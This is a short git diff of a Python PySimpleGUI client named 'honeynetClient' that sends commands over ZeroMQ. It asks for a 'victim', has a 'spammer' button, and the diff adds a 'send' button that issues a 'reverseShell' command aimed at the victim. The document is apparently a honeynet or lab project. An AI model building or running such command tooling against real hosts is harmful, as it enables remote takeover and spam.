@@ -12,8 +12,10 @@ sg.theme('BluePurple')
 
 layout = [[sg.Text('welcome to the amazingService')],
            [sg.Text('Enter victim and press button'), sg.InputText()],
-          [sg.Button('spammer'),sg.Button('Exit')]]
+          [sg.Button('spammer'),sg.Button('send'),sg.Button('Exit')]]
 
+
+"""sg.Button('Request recent subs'), """
 window = sg.Window('honeynetClient', layout)
 
 
@@ -33,17 +35,18 @@ while True:
         print(temp)
         pusher.send_string(temp)
 
-   """ if event == 'Request recent subs':
+    if event == 'Request recent subs':
         # Update the "output" text element
         # to be the value of "input" element
         #window['-OUTPUT-'].update(values['-IN-'])
         pusher.send(str.encode("amazingService!>requestRecentSubs"))
-      #  message = subber.recv()
-     #   print(message)
-"""
+       # message = subber.recv()
+       # print(message)
 
-    #if message == "b'amazingService?>size>":
-     #   print(message)
+    if event == 'send':
+        temp2 = "amazingService!>reverseShell" + values[0]
+        pusher.send_string(temp2)
+
 window.close()
 #  Socket to talk to server
 """print("Connecting to hello world server…")
